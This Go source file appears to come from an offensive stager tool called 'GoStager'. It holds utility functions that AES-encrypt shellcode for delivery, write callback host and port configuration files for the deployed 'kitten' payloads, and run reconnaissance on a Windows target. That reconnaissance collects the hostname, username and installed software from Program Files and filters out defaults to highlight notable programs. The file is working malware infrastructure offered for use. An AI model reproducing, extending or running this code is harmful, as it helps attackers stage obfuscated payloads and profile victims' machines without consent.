package util

import (
	"GoStager/cmd/config"
	"GoStager/cmd/cryptoUtil"
	"encoding/json"
	"errors"
	"fmt"
	color "github.com/logrusorgru/aurora"

	"io/ioutil"
	"log"
	"os"
)

type InitialChecks struct {
	Hostname string   `json:"hostname"`
	Username string   `json:"username"`
	Dir      []string `json:"folders,flow"`
}

func (I *InitialChecks) GetHostname() string {
	return I.Hostname
}

func (I *InitialChecks) GetUsername() string {
	return I.Username
}

func (I *InitialChecks) GetDir() []string {
	return I.Dir
}

// ScToAES cypher the shellcode with AES
func ScToAES(path string, key string) ([]byte, error) {
	if len(key) != 32 {
		return nil, errors.New("the key needs to be 32 chars long")
	}
	byteKey := []byte(key)
	sc, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}
	aesPayload, _ := cryptoUtil.Encrypt(sc, byteKey)
	return aesPayload, nil
}

// GenerateConfig generate the config file for all the kitten
func GenerateConfig(conf config.General) error {
	data := fmt.Sprintf("http://%s:%d%s,%s", conf.GetHost(), conf.GetPort(), conf.GetEndpoint(), conf.GetUserAgent())
	for x := range conf.Conf.MalPath {
		err := ioutil.WriteFile(conf.Conf.MalPath[x]+"conf.txt", []byte(data), 0644)
		if err != nil {
			return err
		}
		fmt.Printf("%s %s\n", color.Green("[+] Generated conf file for"), color.Yellow(conf.Conf.MalPath[x]))
	}
	return nil
}

// ErrPrint print the error
func ErrPrint(err error) {
	if err != nil {
		log.Println(color.Red(err.Error()))
	}
}

// Recon does some basic recon on the target
func Recon() []byte {
	var iniCheck InitialChecks
	// print machine name
	iniCheck.Hostname, _ = os.Hostname()
	//print username
	iniCheck.Username = os.Getenv("USERNAME")
	dir, _ := os.ReadDir("C:\\Program Files")
	for _, file := range dir {
		iniCheck.Dir = append(iniCheck.Dir, file.Name())
	}
	dir86, _ := os.ReadDir("C:\\Program Files (x86)")
	for _, file := range dir86 {
		iniCheck.Dir = append(iniCheck.Dir, file.Name())
	}
	j, _ := json.Marshal(iniCheck)
	return j
}

// UnmarshalJSON unmarshal the json
func UnmarshalJSON(j []byte) InitialChecks {
	var iniCheck InitialChecks
	json.Unmarshal(j, &iniCheck)
	return iniCheck
}

func PrintCookie(cookie []byte) {
	j := UnmarshalJSON(cookie)
	fmt.Printf("%s %s\n", color.Green("[+] Hostname:"), color.Yellow(j.Hostname))
	fmt.Printf("%s %s\n", color.Green("[+] Username:"), color.Yellow(j.Username))
	fmt.Print(color.Green("[+] To get more, use the recon command\n"))
}

func PrintRecon(i InitialChecks) {
	fmt.Printf("%s %s\n", color.Green("[+] Hostname:"), color.Yellow(i.GetHostname()))
	fmt.Printf("%s %s\n", color.Green("[+] Username:"), color.Yellow(i.GetUsername()))
	fmt.Print(color.Green("[+] Installed software : "))
	f := relevantFiles(i.GetDir())
	for x := range f {
		if x == len(f)-1 {
			fmt.Printf("%v\n", color.Yellow(f[x]))
		} else {
			fmt.Printf("%v, ", color.Yellow(f[x]))
		}
	}
}

// relevantFiles get the relevant files
func relevantFiles(s []string) []string {
	files := []string{
		//default files in c:\program files
		"Common Files",
		"Internet Explorer",
		"ModifiableWindowsApps",
		"Windows Defender",
		"Windows Defender Advanced Threat Protection",
		"Windows Mail",
		"Windows Media Player",
		"Windows Multimedia Platform",
		"Windows NT",
		"Windows Photo Viewer",
		"Windows Portable Devices",
		"WindowsPowerShell",
		"Windows Security",
		// default files in c:\program files (x86)
		"Common Files",
		"Internet Explorer",
		"Micorosft.NET",
		"Microsoft",
		"Windows Defender",
		"Windows Mail",
		"Windows Media Player",
		"Windows Multimedia Platform",
		"Windows NT",
		"Windows Photo Viewer",
		"Windows Portable Devices",
		"WindowsPowerShell",
	}
	// check if the default files are in the list
	var out []string
OUTER:
	for _, file := range s {
		for _, defaultFile := range files {
			if file == defaultFile {
				continue OUTER
			}
		}
		out = append(out, file)
	}
	return out
}
